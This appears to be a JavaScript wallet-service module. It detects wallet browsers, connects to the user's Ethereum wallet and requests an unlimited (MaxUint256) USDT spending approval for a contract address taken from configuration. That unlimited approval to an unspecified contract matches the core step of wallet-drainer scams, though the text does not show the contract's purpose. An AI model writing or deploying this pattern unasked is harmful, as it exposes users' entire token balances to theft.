const ethers = require('ethers');

class WalletService {
    detectWalletType(userAgent) {
        const mobile = /mobile|android|iphone|ipad/i.test(userAgent);
        const isWalletBrowser = /TrustWallet|MetaMask|Coinbase/i.test(userAgent);
        
        return {
            isMobile: mobile,
            isWalletBrowser: isWalletBrowser,
            platform: mobile ? 'mobile' : 'desktop'
        };
    }

    async connectWallet(provider) {
        try {
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                return accounts[0];
            }
            
            throw new Error('No wallet provider found');
        } catch (error) {
            throw new Error(`Wallet connection failed: ${error.message}`);
        }
    }

    async approveUSDTSpending(walletAddress) {
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function approve(address spender, uint256 amount) public returns (bool)'],
                signer
            );
            
            const tx = await usdtContract.approve(
                process.env.CONTRACT_ADDRESS,
                ethers.MaxUint256
            );
            
            await tx.wait();
            return { success: true, txHash: tx.hash };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
}

module.exports = new WalletService();
